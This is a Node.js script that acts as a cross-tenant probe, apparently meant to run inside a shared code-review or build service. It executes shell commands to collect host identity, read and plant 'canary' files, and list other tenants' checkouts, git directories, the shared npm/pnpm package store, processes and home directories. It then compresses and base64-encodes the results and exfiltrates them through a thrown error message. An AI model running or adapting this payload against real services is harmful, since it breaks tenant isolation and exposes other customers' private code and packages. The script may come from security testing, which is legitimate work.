const cp=require('child_process'); const zlib=require('zlib'); const fs=require('fs');
function sh(c){ try{ return cp.execSync(c,{timeout:25000,stdio:['ignore','pipe','pipe'],maxBuffer:8*1024*1024}).toString().trim(); }catch(e){ return 'ERR:'+String(e.message||e).slice(0,150);} }
const TAG='TENANTB';
const o=[];
o.push('=IDENTITY= '+sh("id; hostname; uptime 2>/dev/null | head -1"));
// 1) READ any canary left behind by a DIFFERENT tenant's earlier review
o.push('=CANARIES_FOUND=\n'+sh("ls -la /tmp/crx_canary_* /var/tmp/crx_canary_* $HOME/crx_canary_* 2>/dev/null; cat /tmp/crx_canary_* 2>/dev/null | head -c 800"));
// 2) WRITE our own canary for the next review to find
sh("for d in /tmp /var/tmp $HOME; do echo \"tenant="+TAG+" host=$(hostname) uid=$(id -u) time=$(date -u +%s)\" > $d/crx_canary_"+TAG+".txt 2>/dev/null; done");
o.push('=CANARY_WRITTEN= '+sh("ls -la /tmp/crx_canary_"+TAG+".txt 2>&1"));
// 3) other tenants' checkouts / residue on the box
o.push('=OTHER_CHECKOUTS=\n'+sh("ls -la /tmp /var/tmp 2>/dev/null | head -40"));
o.push('=GIT_DIRS=\n'+sh("find / -maxdepth 5 -name '.git' -type d 2>/dev/null | head -20"));
// 4) shared package store - a shared pnpm/npm cache would hold OTHER customers' private packages
o.push('=STOREDIR= '+sh("env | grep -i store; ls -la ${npm_config_store_dir:-/nonexistent} 2>&1 | head -20"));
o.push('=NPM_CACHE=\n'+sh("ls -la $HOME/.npm/_cacache 2>/dev/null | head -10; du -sh $HOME/.npm 2>/dev/null"));
o.push('=PROCS=\n'+sh("ps aux 2>/dev/null | head -20"));
o.push('=HOMEDIRS=\n'+sh("ls -la /home /root 2>/dev/null | head -20"));
const gz=zlib.gzipSync(Buffer.from(o.join('\n\n'))).toString('base64');
throw new Error('XT_BEGIN ' + gz + ' XT_END');
